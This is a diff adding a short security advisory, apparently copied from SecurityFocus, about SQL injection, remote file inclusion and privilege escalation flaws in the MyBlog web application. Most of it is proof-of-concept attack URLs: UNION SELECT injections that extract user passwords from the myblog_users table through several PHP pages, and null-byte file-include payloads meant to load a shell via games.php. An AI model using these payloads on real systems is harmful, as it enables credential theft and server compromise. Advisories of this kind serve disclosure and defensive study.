@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/28313/info
+
+MyBlog is prone to multiple input-validation vulnerabilities, including:
+
+- Multiple SQL-injection vulnerabilities
+- Multiple remote file-include vulnerabilities
+- A privilege-escalation vulnerability
+
+An attacker may exploit these issues to compromise the affected application, execute arbitrary script code in the context of the webserver process, or pass malicious input to database queries, resulting in the modification of query logic or other attacks. 
+
+http://www.example.com/path/member.php?id='+union+select+password,2,3,4,5,6,7,8,9,10+from+myblog_users+/*
+http://www.example.com/path/post.php?id='+union+select+2,3,user,password,6,7,8,9,10,11,12+from+myblog_users/*
+http://www.example.com/path/vote.php?id='+union+select+password,3,4,5,6,7,8,9,10,11,12+from+myblog_users+/*
+http://www.example.com/path/vote.php?mid='+union+select+password,3,4,5,6,7,8,9,10+from+myblog_users+/*
+http://www.example.com/path/games.php?id=[shell]%00
+http://www.example.com/path/games.php?scoreid=[shell]%00 
